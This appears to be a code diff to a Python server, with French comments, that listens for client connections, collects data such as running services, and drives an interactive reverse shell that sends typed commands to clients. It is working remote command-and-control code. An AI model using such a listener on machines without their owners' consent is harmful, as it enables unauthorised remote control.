@@ -15,6 +15,7 @@ class Server():
         self.cAddr = []
         self._serverThreadList = [self._serverData, self._serverReverseShell]
         self.inSession = False
+        self._alreadyConnected = {}
 
 
     def returnServerList(self):
@@ -58,13 +59,13 @@ class Server():
 
             # On crée un thread receiving data
             connection_handler = threading.Thread(
-                target=self._systemData,
+                target=self._clientData,
                 args=(c,)
             )
             connection_handler.start()
             print(self.cSocket)
             
-    def _systemData(self, c):
+    def _clientData(self, c):
         data = {}
         quitting = False
         while not quitting:
@@ -76,11 +77,14 @@ class Server():
             else:
                 # print(data["message"])
                 pass
+            #TODO
+            #if: data is different then update db
+            #else: ignore.
             # print(str(data["RUNNINGSERVICES"]))
-            for k,v in data.items():
-                print(k)
-                print(v)
-            # print(data)
+            # for k,v in data.items():
+            #     print(k)
+            #     print(v)
+            print("Receiving DATA")
             # TODO: Change print for DAO
 
     def _serverReverseShell(self, s):
@@ -103,39 +107,52 @@ class Server():
                 self.cAddr.append(addr)
 
                 print('\nGot connection from', addr)
-
-                # TODO REMOVE****
-                # On crée un thread par connection
-                # threading.Thread(target=self._ReverseShell, args=(c,)).start()
             except socket.timeout:
                 continue
     
     def _reverseShell(self, c):
 
         quitting = False
+        data = {}
 
-        # Reçoit le premier message et initialise data["cwd"]
-        data = self._receiving(c)
+        try:
+            data['cwd'] = self._alreadyConnected[c]
+        except KeyError:
+            # Reçoit le premier message et initialise data["cwd"]
+            data = self._receiving(c)
+            self._alreadyConnected[c] = data['cwd']
+        
         while not quitting:
-
-            data["command"] = input(f"{data['cwd']} $> ")
-            if not data["command"].strip():
-                continue
-            elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
-                self._clrscr()
-                continue
-            else:
-                self._sending(c, data)
-                data = self._receiving(c)
+            try:
+                # On envoi une commande
+                data["command"] = input(f"{data['cwd']} $> ")
+                if not data["command"].strip():
+                    continue
+                elif data["command"].lower() == "cls" or data["command"].lower() == "clear":
+                    self._clrscr()
+                    continue
+                else:
+                    self._sending(c, data)
+                    data = self._receiving(c)
+                
+                if data["command"].lower() == "destroy":
+                    self.cSocket.pop(self.cSocket.index(c))
+                    quitting = True
+                    c.close()
+                    self.inSession = False
+                    continue
+                if data["command"].lower() == "exit":
+                    quitting = True
+                    self.inSession = False
             
-            if data["command"].lower() == "exit":
+                print(data["output"])
+            except ConnectionResetError:
                 self.cSocket.pop(self.cSocket.index(c))
                 quitting = True
                 c.close()
                 self.inSession = False
-                continue
-        
-            print(data["output"])
+            except KeyboardInterrupt:
+                break
   
     def startReverseShellInstance(self, c):
         threading.Thread(target=self._reverseShell, args=(c,)).start()
@@ -151,18 +168,6 @@ class Server():
 
 if __name__ == "__main__":
    Server().main()
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
